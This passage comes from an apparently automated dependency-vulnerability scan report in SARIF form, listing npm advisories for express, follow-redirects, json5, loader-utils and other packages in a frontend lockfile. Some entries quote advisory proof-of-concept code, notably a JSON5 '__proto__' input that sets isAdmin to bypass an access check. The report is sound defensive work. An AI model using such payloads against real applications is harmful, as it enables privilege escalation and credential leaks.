"ee51d20fa5a14f7a039eafb5838ace27"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?express","index": 12 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/express@4.17.3"}]}]}, {"ruleId": "CVE-2024-43796","level": "warning","message": {"text": "CVE-2024-43796 - Express.js minimalist web framework for node. In express < 4.20.0, passing untrusted user input - even after sanitizing it - to response.redirect() may execute untrusted code. This issue is patched in express 4.20.0."},"partialFingerprints": {"vulnerabilityHash": "4ea34bfca97ea8ffd08cc94365f0ebbc"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?express","index": 12 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/express@4.17.3"}]}]}, {"ruleId": "CVE-2024-28849","level": "warning","message": {"text": "CVE-2024-28849 - follow-redirects is an open source, drop-in replacement for Node's `http` and `https` modules that automatically follows redirects. In affected versions follow-redirects only clears authorization header during cross-domain redirect, but keep the proxy-authentication header which contains credentials too. This vulnerability may lead to credentials leak, but has been addressed in version 1.15.6. Users are advised to upgrade. There are no known workarounds for this vulnerability.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-28849 for details"},"partialFingerprints": {"vulnerabilityHash": "e63f2e51dd14481def42015bfea0a251"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?follow-redirects","index": 13 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/follow-redirects@1.14.9"}]}]}, {"ruleId": "GHSA-cxjh-pqwp-8mfp","level": "warning","message": {"text": "GHSA-cxjh-pqwp-8mfp - When using [axios](https:\/\/github.com\/axios\/axios), its dependency follow-redirects only clears authorization header during cross-domain redirect, but allows the proxy-authentication header which contains credentials too.\n\n## Steps To Reproduce & PoC\n\nTest code:\n\n```js\nconst axios = require('axios');\n\naxios.get('http:\/\/127.0.0.1:10081\/', {\n headers: {\n 'AuThorization': 'Rear Test',\n 'ProXy-AuthoriZation': 'Rear Test',\n 'coOkie': 't=1'\n }\n})\n .then((response) => {\n console.log(response);\n })\n```\n\nWhen I meet the cross-domain redirect, the sensitive headers like authorization and cookie are cleared, but proxy-authentication header is kept.\n\n## Impact\n\nThis vulnerability may lead to credentials leak.\n\n## Recommendations\n\nRemove proxy-authentication header during cross-domain redirect\n\n### Recommended Patch\n\n[follow-redirects\/index.js:464](https:\/\/github.com\/follow-redirects\/follow-redirects\/commit\/c4f847f85176991f95ab9c88af63b1294de8649b)\n\n```diff\n- removeMatchingHeaders(\/^(?:authorization|cookie)$\/i, this._options.headers);\n+ removeMatchingHeaders(\/^(?:authorization|proxy-authorization|cookie)$\/i, this._options.headers);\n```"},"partialFingerprints": {"vulnerabilityHash": "74d13586fe0bc7c2629b5a3caaae1054"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?follow-redirects","index": 13 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/follow-redirects@1.14.9"}]}]}, {"ruleId": "CVE-2023-26159","level": "warning","message": {"text": "CVE-2023-26159 - Versions of the package follow-redirects before 1.15.4 are vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches."},"partialFingerprints": {"vulnerabilityHash": "064f4f20b167e1348df4f542525945ad"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?follow-redirects","index": 13 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/follow-redirects@1.14.9"}]}]}, {"ruleId": "GHSA-jchw-25xp-jwwc","level": "warning","message": {"text": "GHSA-jchw-25xp-jwwc - Versions of the package follow-redirects before 1.15.4 are vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches."},"partialFingerprints": {"vulnerabilityHash": "44be63b9db1e07b74907c677138cbc92"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?follow-redirects","index": 13 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/follow-redirects@1.14.9"}]}]}, {"ruleId": "CVE-2022-25881","level": "warning","message": {"text": "CVE-2022-25881 - This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library."},"partialFingerprints": {"vulnerabilityHash": "ad1431c6c6a66aaa17b947f24440bb54"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?http-cache-semantics","index": 14 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/http-cache-semantics@4.1.0"}]}]}, {"ruleId": "GHSA-rc47-6667-2j5j","level": "warning","message": {"text": "GHSA-rc47-6667-2j5j - http-cache semantics contains an Inefficient Regular Expression Complexity , leading to Denial of Service. This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library."},"partialFingerprints": {"vulnerabilityHash": "46212672fa0c4195e6a18dd93e546f88"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?http-cache-semantics","index": 14 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/http-cache-semantics@4.1.0"}]}]}, {"ruleId": "CVE-2024-21536","level": "warning","message": {"text": "CVE-2024-21536 - Versions of the package http-proxy-middleware before 2.0.7, from 3.0.0 and before 3.0.3 are vulnerable to Denial of Service (DoS) due to an UnhandledPromiseRejection error thrown by micromatch. An attacker could kill the Node.js process and crash the server by making requests to certain paths."},"partialFingerprints": {"vulnerabilityHash": "94e6727dead3e01885ff5bc6f75b432d"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?http-proxy-middleware","index": 15 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/http-proxy-middleware@2.0.3"}]}]}, {"ruleId": "GHSA-c7qv-q95q-8v27","level": "warning","message": {"text": "GHSA-c7qv-q95q-8v27 - Versions of the package http-proxy-middleware before 2.0.7, from 3.0.0 and before 3.0.3 are vulnerable to Denial of Service (DoS) due to an UnhandledPromiseRejection error thrown by micromatch. An attacker could kill the Node.js process and crash the server by making requests to certain paths."},"partialFingerprints": {"vulnerabilityHash": "71177d1fb9d9d4a44b91997ea4823d37"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?http-proxy-middleware","index": 15 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/http-proxy-middleware@2.0.3"}]}]}, {"ruleId": "CVE-2025-32996","level": "warning","message": {"text": "CVE-2025-32996 - In http-proxy-middleware before 2.0.8 and 3.x before 3.0.4, writeBody can be called twice because \"else if\" is not used."},"partialFingerprints": {"vulnerabilityHash": "577f3ab364a535f31faddb6b21e823db"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?http-proxy-middleware","index": 15 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/http-proxy-middleware@2.0.3"}]}]}, {"ruleId": "CVE-2025-32997","level": "warning","message": {"text": "CVE-2025-32997 - In http-proxy-middleware before 2.0.9 and 3.x before 3.0.5, fixRequestBody proceeds even if bodyParser has failed."},"partialFingerprints": {"vulnerabilityHash": "40ca994c577af04db859f0fdf9659cba"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?http-proxy-middleware","index": 15 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/http-proxy-middleware@2.0.3"}]}]}, {"ruleId": "GHSA-4www-5p9h-95mh","level": "warning","message": {"text": "GHSA-4www-5p9h-95mh - In http-proxy-middleware before 2.0.8 and 3.x before 3.0.4, writeBody can be called twice because \"else if\" is not used."},"partialFingerprints": {"vulnerabilityHash": "2860c746cc9e3cfbc2b1764e1503eee2"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?http-proxy-middleware","index": 15 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/http-proxy-middleware@2.0.3"}]}]}, {"ruleId": "GHSA-9gqv-wp59-fq42","level": "warning","message": {"text": "GHSA-9gqv-wp59-fq42 - In http-proxy-middleware before 2.0.9 and 3.x before 3.0.5, fixRequestBody proceeds even if bodyParser has failed."},"partialFingerprints": {"vulnerabilityHash": "be73548ae09d2cc2c63974e47d15fa21"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?http-proxy-middleware","index": 15 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/http-proxy-middleware@2.0.3"}]}]}, {"ruleId": "CVE-2023-42282","level": "warning","message": {"text": "CVE-2023-42282 - The ip package before 1.1.9 for Node.js might allow SSRF because some IP addresses (such as 0x7f.1) are improperly categorized as globally routable via isPublic."},"partialFingerprints": {"vulnerabilityHash": "d711b1eca308ba4a6889b9833a13e691"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?ip","index": 16 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/ip@1.1.5"}]}]}, {"ruleId": "GHSA-2p57-rm9w-gvfp","level": "warning","message": {"text": "GHSA-2p57-rm9w-gvfp - The ip package through 2.0.1 for Node.js might allow SSRF because some IP addresses (such as 127.1, 01200034567, 012.1.2.3, 000:0:0000::01, and ::fFFf:127.0.0.1) are improperly categorized as globally routable via isPublic. NOTE: this issue exists because of an incomplete fix for CVE-2023-42282."},"partialFingerprints": {"vulnerabilityHash": "167323ec12600d179104708cf2649a76"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?ip","index": 16 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/ip@1.1.5"}]}]}, {"ruleId": "GHSA-78xj-cgh5-2h22","level": "warning","message": {"text": "GHSA-78xj-cgh5-2h22 - The `isPublic()` function in the NPM package `ip` doesn't correctly identify certain private IP addresses in uncommon formats such as `0x7F.1` as private. Instead, it reports them as public by returning `true`. This can lead to security issues such as Server-Side Request Forgery (SSRF) if `isPublic()` is used to protect sensitive code paths when passed user input. Versions 1.1.9 and 2.0.1 fix the issue."},"partialFingerprints": {"vulnerabilityHash": "0bf4b241cad93852767c0580609879a6"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?ip","index": 16 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/ip@1.1.5"}]}]}, {"ruleId": "CVE-2022-46175","level": "warning","message": {"text": "CVE-2022-46175 - JSON5 is an extension to the popular JSON file format that aims to be easier to write and maintain by hand (e.g. for config files). The `parse` method of the JSON5 library before and including versions 1.0.1 and 2.2.1 does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object. This vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations. This vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution. `JSON5.parse` should restrict parsing of `__proto__` keys when parsing JSON strings to objects. As a point of reference, the `JSON.parse` method included in JavaScript ignores `__proto__` keys. Simply changing `JSON5.parse` to `JSON.parse` in the examples above mitigates this vulnerability. This vulnerability is patched in json5 versions 1.0.2, 2.2.2, and later.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2022-46175 for details"},"partialFingerprints": {"vulnerabilityHash": "896c3cef6984b755f84eb1482bb0b503"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?json5","index": 17 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/json5@1.0.1"}]}]}, {"ruleId": "GHSA-9c47-m6qq-7p4h","level": "warning","message": {"text": "GHSA-9c47-m6qq-7p4h - The `parse` method of the JSON5 library before and including version `2.2.1` does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object.\n\nThis vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations.\n\n## Impact\nThis vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution.\n\n## Mitigation\nThis vulnerability is patched in json5 v2.2.2 and later. A patch has also been backported for json5 v1 in versions v1.0.2 and later.\n\n## Details\n \nSuppose a developer wants to allow users and admins to perform some risky operation, but they want to restrict what non-admins can do. To accomplish this, they accept a JSON blob from the user, parse it using `JSON5.parse`, confirm that the provided data does not set some sensitive keys, and then performs the risky operation using the validated data:\n \n```js\nconst JSON5 = require('json5');\n\nconst doSomethingDangerous = (props) => {\n  if (props.isAdmin) {\n    console.log('Doing dangerous thing as admin.');\n  } else {\n    console.log('Doing dangerous thing as user.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound = false;\n  Object.keys(obj).forEach((key) => {\n    if (searchKeys.indexOf(key) > -1) {\n      searchKeyFound = true;\n    }\n  });\n  return searchKeyFound;\n};\n\nconst props = JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); \/\/ \"Doing dangerous thing as user.\"\n} else {\n  throw new Error('Forbidden...');\n}\n```\n \nIf the user attempts to set the `isAdmin` key, their request will be rejected:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n} else {\n  throw new Error('Forbidden...'); \/\/ Error: Forbidden...\n}\n```\n \nHowever, users can instead set the `__proto__` key to `{\"isAdmin\": true}`. `JSON5` will parse this key and will set the `isAdmin` key on the prototype of the returned object, allowing the user to bypass the security check and run their request as an admin:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); \/\/ \"Doing dangerous thing as admin.\"\n} else {\n  throw new Error('Forbidden...');\n}\n ```"},"partialFingerprints": {"vulnerabilityHash": "2edcc8417d3c4a3a6ecfe4ac7232f594"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?json5","index": 17 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/json5@1.0.1"}]}]}, {"ruleId": "CVE-2022-46175","level": "warning","message": {"text": "CVE-2022-46175 - JSON5 is an extension to the popular JSON file format that aims to be easier to write and maintain by hand (e.g. for config files). The `parse` method of the JSON5 library before and including versions 1.0.1 and 2.2.1 does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object. This vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations. This vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution. `JSON5.parse` should restrict parsing of `__proto__` keys when parsing JSON strings to objects. As a point of reference, the `JSON.parse` method included in JavaScript ignores `__proto__` keys. Simply changing `JSON5.parse` to `JSON.parse` in the examples above mitigates this vulnerability. This vulnerability is patched in json5 versions 1.0.2, 2.2.2, and later.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2022-46175 for details"},"partialFingerprints": {"vulnerabilityHash": "896c3cef6984b755f84eb1482bb0b503"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?json5","index": 18 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/json5@2.2.0"}]}]}, {"ruleId": "GHSA-9c47-m6qq-7p4h","level": "warning","message": {"text": "GHSA-9c47-m6qq-7p4h - The `parse` method of the JSON5 library before and including version `2.2.1` does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object.\n\nThis vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations.\n\n## Impact\nThis vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution.\n\n## Mitigation\nThis vulnerability is patched in json5 v2.2.2 and later. A patch has also been backported for json5 v1 in versions v1.0.2 and later.\n\n## Details\n \nSuppose a developer wants to allow users and admins to perform some risky operation, but they want to restrict what non-admins can do. To accomplish this, they accept a JSON blob from the user, parse it using `JSON5.parse`, confirm that the provided data does not set some sensitive keys, and then performs the risky operation using the validated data:\n \n```js\nconst JSON5 = require('json5');\n\nconst doSomethingDangerous = (props) => {\n  if (props.isAdmin) {\n    console.log('Doing dangerous thing as admin.');\n  } else {\n    console.log('Doing dangerous thing as user.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound = false;\n  Object.keys(obj).forEach((key) => {\n    if (searchKeys.indexOf(key) > -1) {\n      searchKeyFound = true;\n    }\n  });\n  return searchKeyFound;\n};\n\nconst props = JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); \/\/ \"Doing dangerous thing as user.\"\n} else {\n  throw new Error('Forbidden...');\n}\n```\n \nIf the user attempts to set the `isAdmin` key, their request will be rejected:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n} else {\n  throw new Error('Forbidden...'); \/\/ Error: Forbidden...\n}\n```\n \nHowever, users can instead set the `__proto__` key to `{\"isAdmin\": true}`. `JSON5` will parse this key and will set the `isAdmin` key on the prototype of the returned object, allowing the user to bypass the security check and run their request as an admin:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); \/\/ \"Doing dangerous thing as admin.\"\n} else {\n  throw new Error('Forbidden...');\n}\n ```"},"partialFingerprints": {"vulnerabilityHash": "2edcc8417d3c4a3a6ecfe4ac7232f594"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?json5","index": 18 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/json5@2.2.0"}]}]}, {"ruleId": "CVE-2022-37601","level": "warning","message": {"text": "CVE-2022-37601 - Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils via the name variable in parseQuery.js. This affects all versions prior to 1.4.1 and 2.0.3."},"partialFingerprints": {"vulnerabilityHash": "a026e489c598e5c0d89bf6c5cdb5a88d"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 20 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@1.4.0"}]}]}, {"ruleId": "GHSA-76p3-8jx3-jpfq","level": "warning","message": {"text": "GHSA-76p3-8jx3-jpfq - Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils prior to version 2.0.3 via the name variable in parseQuery.js."},"partialFingerprints": {"vulnerabilityHash": "0b659ca08e5f54e080d9eb650331e844"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 20 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@1.4.0"}]}]}, {"ruleId": "CVE-2022-37599","level": "warning","message": {"text": "CVE-2022-37599 - A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the resourcePath variable in interpolateName.js."},"partialFingerprints": {"vulnerabilityHash": "2d768a9b9cfa795746448dcd82f6d42e"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 20 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@1.4.0"}]}]}, {"ruleId": "CVE-2022-37603","level": "warning","message": {"text": "CVE-2022-37603 - A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js."},"partialFingerprints": {"vulnerabilityHash": "91a5ea910eab2a6e18c3d4a331c94cc1"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 20 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@1.4.0"}]}]}, {"ruleId": "GHSA-3rfm-jhwj-7488","level": "warning","message": {"text": "GHSA-3rfm-jhwj-7488 - A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1."},"partialFingerprints": {"vulnerabilityHash": "e760beeedf57916f0587ce3cdad82273"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 20 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@1.4.0"}]}]}, {"ruleId": "GHSA-hhq3-ff78-jv3g","level": "warning","message": {"text": "GHSA-hhq3-ff78-jv3g - A regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils via the resourcePath variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1."},"partialFingerprints": {"vulnerabilityHash": "9e6652185631360e0345294e18590c5a"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 20 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@1.4.0"}]}]}, {"ruleId": "CVE-2022-37601","level": "warning","message": {"text": "CVE-2022-37601 - Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils via the name variable in parseQuery.js. This affects all versions prior to 1.4.1 and 2.0.3."},"partialFingerprints": {"vulnerabilityHash": "a026e489c598e5c0d89bf6c5cdb5a88d"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 21 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@2.0.2"}]}]}, {"ruleId": "GHSA-76p3-8jx3-jpfq","level": "warning","message": {"text": "GHSA-76p3-8jx3-jpfq - Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils prior to version 2.0.3 via the name variable in parseQuery.js."},"partialFingerprints": {"vulnerabilityHash": "0b659ca08e5f54e080d9eb650331e844"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 21 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@2.0.2"}]}]}, {"ruleId": "CVE-2022-37599","level": "warning","message": {"text": "CVE-2022-37599 - A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the resourcePath variable in interpolateName.js."},"partialFingerprints": {"vulnerabilityHash": "2d768a9b9cfa795746448dcd82f6d42e"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 21 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@2.0.2"}]}]}, {"ruleId": "CVE-2022-37603","level": "warning","message": {"text": "CVE-2022-37603 - A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js."},"partialFingerprints": {"vulnerabilityHash": "91a5ea910eab2a6e18c3d4a331c94cc1"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 21 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@2.0.2"}]}]}, {"ruleId": "GHSA-3rfm-jhwj-7488","level": "warning","message": {"text": "GHSA-3rfm-jhwj-7488 - A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1."},"partialFingerprints": {"vulnerabilityHash": "e760beeedf57916f0587ce3cdad82273"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 21 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@2.0.2"}]}]}, {"ruleId": "GHSA-hhq3-ff78-jv3g","level": "warning","message": {"text": "GHSA-hhq3-ff78-jv3g - A regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils via the resourcePath variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1."},"partialFingerprints": {"vulnerabilityHash": "9e6652185631360e0345294e18590c5a"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 21 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@2.0.2"}]}]}, {"ruleId": "CVE-2022-37599","level": "warning","message": {"text": "CVE-2022-37599 - A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the resourcePath variable in interpolateName.js."},"partialFingerprints": {"vulnerabilityHash": "2d768a9b9cfa795746448dcd82f6d42e"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 22 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@3.2.0"}]}]}, {"ruleId": "CVE-2022-37603","level": "warning","message": {"text": "CVE-2022-37603 - A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js."},"partialFingerprints": {"vulnerabilityHash": "91a5ea910eab2a6e18c3d4a331c94cc1"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 22 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@3.2.0"}]}]}, {"ruleId": "GHSA-3rfm-jhwj-7488","level": "warning","message": {"text": "GHSA-3rfm-jhwj-7488 - A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1."},"partialFingerprints": {"vulnerabilityHash": "e760beeedf57916f0587ce3cdad82273"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 22 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/loader-utils@3.2.0"}]}]}, {"ruleId": "GHSA-hhq3-ff78-jv3g","level": "warning","message": {"text": "GHSA-hhq3-ff78-jv3g - A regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils via the resourcePath variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1."},"partialFingerprints": {"vulnerabilityHash": "9e6652185631360e0345294e18590c5a"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils","index": 22 }},"logicalLocations": [{"fullyQualifiedName": 